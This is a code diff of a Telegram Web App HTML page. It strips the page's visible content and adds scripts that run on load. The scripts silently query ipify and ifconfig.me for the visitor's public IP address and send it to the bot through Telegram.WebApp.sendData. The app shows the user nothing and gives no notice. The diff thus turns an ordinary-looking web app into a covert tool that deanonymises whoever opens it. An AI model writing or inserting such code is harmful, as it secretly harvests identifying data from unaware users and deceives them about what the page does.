@@ -1,36 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Web App</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        #telegramData {
-            margin-top: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            margin-top: 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>var IS_IP_SENT = false; function sendIPtoBot(ip) { if (IS_IP_SENT) return; IS_IP_SENT = true; window.Telegram.WebApp.sendData(`{"web_app_ip":"${ip}"}`); }</script>
+    <script type="application/javascript">function getIP(json) { sendIPtoBot(json.ip); }</script>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    <script>fetch('https://ifconfig.me/ip').then(response => response.text()).then(ip => { sendIPtoBot(ip.trim()); });</script>
+    <script>document.DOMContentLoaded = function () { };</script>
 </head>
-<body>
-    <h1>Welcome to Telegram Web App</h1>
-    <div id="telegramData">
-        <p><strong>User ID:</strong> <span id="userId">N/A</span></p>
-        <p><strong>Username:</strong> <span id="username">N/A</span></p>
-        <p><strong>First Name:</strong> <span id="firstName">N/A</span></p>
-        <p><strong>Last Name:</strong> <span id="lastName">N/A</span></p>
-    </div>
-    <button id="closeApp">Close App</button>
 
-    <script src="telegram-web-app.js"></script>
-</body>
 </html>
